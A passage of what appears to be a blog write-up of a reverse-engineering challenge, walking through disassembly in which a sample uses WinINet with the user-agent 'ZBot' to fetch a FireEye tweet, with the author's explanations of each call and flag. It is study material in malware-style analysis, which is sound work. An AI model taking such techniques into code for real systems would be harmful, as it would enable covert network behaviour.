</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">29
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:004018<span style=color:#268bd2>A0</span> <span style=color:#268bd2>sub_4018A0</span> <span style=color:#268bd2>proc</span> <span style=color:#268bd2>near</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>A0</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>A0</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ebp</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>A1</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ebp</span>, <span style=color:#b58900>esp</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>A3</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, <span style=color:#2aa198>1088h</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>A8</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>__alloca_probe</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>AD</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, <span style=color:#268bd2>___security_cookie</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>B2</span> <span style=color:#268bd2>xor</span>     <span style=color:#b58900>eax</span>, <span style=color:#b58900>ebp</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>B4</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_4</span>], <span style=color:#b58900>eax</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>B7</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ebx</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>B8</span> <span style=color:#268bd2>xor</span>     <span style=color:#b58900>ebx</span>, <span style=color:#b58900>ebx</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>BA</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ebx</span>             <span style=color:#586e75>; dwFlags - 0x00</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>BB</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ebx</span>             <span style=color:#586e75>; lpszProxyBypass - 0x00</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>BC</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ebx</span>             <span style=color:#586e75>; lpszProxy - 0x00</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>BD</span> <span style=color:#268bd2>push</span>    <span style=color:#2aa198>1</span>               <span style=color:#586e75>; dwAccessType - INTERNET_OPEN_TYPE_DIRECT</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>BD</span>                         <span style=color:#586e75>; Meaning direct access</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>BF</span> <span style=color:#268bd2>push</span>    <span style=color:#268bd2>offset</span> <span style=color:#268bd2>szAgent</span>  <span style=color:#586e75>; &#34;ZBot&#34;</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>C4</span> <span style=color:#268bd2>call</span>    <span style=color:#b58900>ds</span>:<span style=color:#268bd2>InternetOpenW</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>CA</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_1088</span>], <span style=color:#b58900>eax</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>D0</span> <span style=color:#268bd2>cmp</span>     <span style=color:#b58900>eax</span>, <span style=color:#b58900>ebx</span>          <span style=color:#586e75>; If a NULL handle is returned (no internet connectivity) exit</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>D2</span> <span style=color:#268bd2>jnz</span>     <span style=color:#268bd2>short</span> <span style=color:#268bd2>loc_4018E5</span>  <span style=color:#586e75>; otherwise jump to loc_4018E5</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>D4</span> <span style=color:#268bd2>xor</span>     <span style=color:#b58900>eax</span>, <span style=color:#b58900>eax</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>D6</span> <span style=color:#268bd2>pop</span>     <span style=color:#b58900>ebx</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>D7</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ecx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_4</span>]
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>DA</span> <span style=color:#268bd2>xor</span>     <span style=color:#b58900>ecx</span>, <span style=color:#b58900>ebp</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>DC</span> <span style=color:#268bd2>call</span>    @<span style=color:#268bd2>__security_check_cookie@4</span> <span style=color:#586e75>; __security_check_cookie(x)</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>E1</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>esp</span>, <span style=color:#b58900>ebp</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>E3</span> <span style=color:#268bd2>pop</span>     <span style=color:#b58900>ebp</span>             <span style=color:#586e75>; exit if NULL handle was retured</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>E4</span> <span style=color:#268bd2>ret</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>We see <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096%28v=vs.85%29.aspx" target=_blank rel="noreferrer noopener">InternetOpen</a> called. This function initialises the WinINet functions. Agent name is <code>ZBot</code> which is an alternate name for the <code>Zeus</code> trojan horse. Access type is <code>INTERNET_OPEN_TYPE_DIRECT</code> which means direct access without the use of any proxies. If a NULL handle is returned then function will exit (line 28). If not it will jump to <code>loc_4018E5</code> (line 21).</p><figure class=code><figcaption><span>loc 4018E5 - InternetOpenUrl</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">39
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:004018<span style=color:#268bd2>E5</span> <span style=color:#268bd2>loc_4018E5</span>:             <span style=color:#586e75>; dwContext</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>E5</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ebx</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>E6</span> <span style=color:#268bd2>push</span>    <span style=color:#2aa198>400100h</span>         <span style=color:#586e75>; dwFlags</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>EB</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ebx</span>             <span style=color:#586e75>; dwHeadersLength - 0x00</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>EC</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ebx</span>             <span style=color:#586e75>; lpszHeaders - 0x00</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>ED</span> <span style=color:#268bd2>lea</span>     <span style=color:#b58900>ecx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>szUrl</span>]
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>F0</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ecx</span>             <span style=color:#586e75>; lpszUrl</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>F1</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>eax</span>             <span style=color:#586e75>; hInternet - Handle from previous InternetOpen</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>F2</span> <span style=color:#268bd2>mov</span>     <span style=color:#dc322f>dword</span> <span style=color:#268bd2>ptr</span> [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>szUrl</span>], <span style=color:#2aa198>740068h</span>
</span></span><span style=display:flex><span>.text:004018<span style=color:#268bd2>F9</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_78</span>], <span style=color:#2aa198>700074h</span>
</span></span><span style=display:flex><span>.text:00401900 <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_74</span>], <span style=color:#2aa198>3A0073h</span>
</span></span><span style=display:flex><span>.text:00401907 <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_70</span>], <span style=color:#2aa198>2F002Fh</span>
</span></span><span style=display:flex><span>.text:0040190<span style=color:#268bd2>E</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_6C</span>], <span style=color:#2aa198>770074h</span>
</span></span><span style=display:flex><span>.text:00401915 <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_68</span>], <span style=color:#2aa198>740069h</span>
</span></span><span style=display:flex><span>.text:0040191<span style=color:#268bd2>C</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_64</span>], <span style=color:#2aa198>650074h</span>
</span></span><span style=display:flex><span>.text:00401923 <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_60</span>], <span style=color:#2aa198>2E0072h</span>
</span></span><span style=display:flex><span>.text:0040192<span style=color:#268bd2>A</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_5C</span>], <span style=color:#2aa198>6F0063h</span>
</span></span><span style=display:flex><span>.text:00401931 <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_58</span>], <span style=color:#2aa198>2F006Dh</span>
</span></span><span style=display:flex><span>.text:00401938 <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_54</span>], <span style=color:#2aa198>690046h</span>
</span></span><span style=display:flex><span>.text:0040193<span style=color:#268bd2>F</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_50</span>], <span style=color:#2aa198>650072h</span>
</span></span><span style=display:flex><span>.text:00401946 <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_4C</span>], <span style=color:#2aa198>790045h</span>
</span></span><span style=display:flex><span>.text:0040194<span style=color:#268bd2>D</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_48</span>], <span style=color:#2aa198>2F0065h</span>
</span></span><span style=display:flex><span>.text:00401954 <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_44</span>], <span style=color:#2aa198>740073h</span>
</span></span><span style=display:flex><span>.text:0040195<span style=color:#268bd2>B</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_40</span>], <span style=color:#2aa198>740061h</span>
</span></span><span style=display:flex><span>.text:00401962 <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_3C</span>], <span style=color:#2aa198>730075h</span>
</span></span><span style=display:flex><span>.text:00401969 <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_38</span>], <span style=color:#2aa198>34002Fh</span>
</span></span><span style=display:flex><span>.text:00401970 <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_34</span>], <span style=color:#2aa198>340038h</span>
</span></span><span style=display:flex><span>.text:00401977 <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_30</span>], <span style=color:#2aa198>330030h</span>
</span></span><span style=display:flex><span>.text:0040197<span style=color:#268bd2>E</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_2C</span>], <span style=color:#2aa198>350033h</span>
</span></span><span style=display:flex><span>.text:00401985 <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_28</span>], <span style=color:#2aa198>350031h</span>
</span></span><span style=display:flex><span>.text:0040198<span style=color:#268bd2>C</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_24</span>], <span style=color:#2aa198>330035h</span>
</span></span><span style=display:flex><span>.text:00401993 <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_20</span>], <span style=color:#2aa198>310038h</span>
</span></span><span style=display:flex><span>.text:0040199<span style=color:#268bd2>A</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_1C</span>], <span style=color:#2aa198>360031h</span>
</span></span><span style=display:flex><span>.text:004019<span style=color:#268bd2>A1</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_18</span>], <span style=color:#2aa198>300036h</span>
</span></span><span style=display:flex><span>.text:004019<span style=color:#268bd2>A8</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_14</span>], <span style=color:#2aa198>38h</span>   <span style=color:#586e75>; https://twitter.com/FireEye/status/484033515538116608</span>
</span></span><span style=display:flex><span>.text:004019<span style=color:#268bd2>AF</span> <span style=color:#268bd2>call</span>    <span style=color:#b58900>ds</span>:<span style=color:#268bd2>InternetOpenUrlW</span> <span style=color:#586e75>; open URL</span>
</span></span><span style=display:flex><span>.text:004019<span style=color:#268bd2>B5</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>hInternet</span>], <span style=color:#b58900>eax</span>
</span></span><span style=display:flex><span>.text:004019<span style=color:#268bd2>BB</span> <span style=color:#268bd2>cmp</span>     <span style=color:#b58900>eax</span>, <span style=color:#b58900>ebx</span>        <span style=color:#586e75>; ebx == 0x00 - check if eax is zero</span>
</span></span><span style=display:flex><span>.text:004019<span style=color:#268bd2>BD</span> <span style=color:#268bd2>jz</span>      <span style=color:#268bd2>loc_4018D4</span>      <span style=color:#586e75>; if (eax == 0 ) jump to loc_4018D4 (return immedi</span></span></span></code></pre></td></tr></table></div></div></div></figure><p><a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa385098%28v=vs.85%29.aspx" target=_blank rel="noreferrer noopener">InternetOpenUrl</a> opens a handle to a resource. <code>dwFlags</code> is set to <code>0x00400100</code>. I could not find the exact meaning of this flag value. However, according to <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa383661%28v=vs.85%29.aspx" target=_blank rel="noreferrer noopener">this page</a> it could be the <code>OR</code> of two flags (does it work that way?):</p><figure class=code><figcaption><span>0x00400100 flag</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">5
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>INTERNET_FLAG_KEEP_CONNECTION: 0x00400000
</span></span><span style=display:flex><span>Uses <span style=color:#b58900>keep-alive</span> semantics, <span style=color:#719e07>if</span> available, <span style=color:#719e07>for</span> the connection.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>INTERNET_FLAG_PRAGMA_NOCACHE: 0x00000100
</span></span><span style=display:flex><span>Forces the request to be resolved by the origin server.</span></span></code></pre></td></tr></table></div></div></div></figure><p>Lines 9 to 35 are saving the URL, we know what it is without even looking at it. We have seen it in Wireshark before. The URL is <code>https://twitter.com/FireEye/status/484033515538116608</code>.</p><p><img src=/images/2014/flare/7-2.jpg alt="Fireeye tweet" title="Fireeye tweet"></p><p>Line 37 saves return value which is a "valid handle to the URL if the connection is successfully established, or NULL if the connection fails". Then it is checked for being NULL, if so we will jump to <code>loc_4018D4</code> and function returns immediately. If we have a handle to the tweet, execution continues.</p><figure class=code><figcaption><span>loc 4019D6 - InternetReadFile</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">33
